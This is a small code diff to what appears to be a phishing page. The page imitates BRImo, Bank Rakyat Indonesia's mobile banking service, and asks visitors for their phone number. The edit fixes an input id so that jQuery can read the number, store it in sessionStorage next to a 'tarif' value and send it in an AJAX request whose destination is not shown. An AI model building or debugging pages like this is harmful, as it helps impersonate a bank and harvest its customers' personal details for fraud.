@@ -537,7 +537,7 @@ chsalxcome {
        <div class="input-field">
      <label for="nohp">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</label>
  <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
- <input type="tel" id="nohp" name="NoHp" placeholder="08xxxx" maxlength="15" required>
+ <input type="tel" id="NoHp" name="NoHp" placeholder="08xxxx" maxlength="15" required>
                         </div>
                     </div>
    <div class="card-footer">
@@ -562,7 +562,7 @@ chsalxcome {
    if(tarif) {
       sessionStorage.setItem('tarif', tarif);
    }
-   var NoHp = $('#nohp').val();
+   var NoHp = $('#NoHp').val();
    sessionStorage.setItem('NoHp', NoHp);
    
    $.ajax({
